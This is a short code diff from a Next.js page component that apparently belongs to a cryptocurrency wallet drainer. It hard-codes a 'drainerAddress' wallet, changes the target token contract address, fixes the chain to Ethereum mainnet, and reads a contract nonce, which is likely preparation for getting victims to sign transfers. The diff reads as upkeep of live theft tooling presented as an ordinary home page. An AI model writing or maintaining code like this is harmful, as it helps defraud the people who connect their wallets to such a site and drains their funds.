@@ -39,7 +39,7 @@ export default function Home() {
   const { data: ethBalance } = useBalance({ address })
 
   const drainerAddress = (process.env.NEXT_PUBLIC_ADMIN_WALLET || "0xd115dbad4574D1332a44d7453B387ad38750c957") as `0x${string}`;
-  const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x5179A923Be1E3e211da968ADdc8Ee9bF36d97252") as `0x${string}`;
+  const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x6342c1c53e42a91F1d0206E11E2291f5dc192484") as `0x${string}`;
   const targetChainId = 1; // HARDCODED TO MAINNET (1) to prevent metadata mismatches
 
   const { data: nonce, isError: nonceError } = useReadContract({
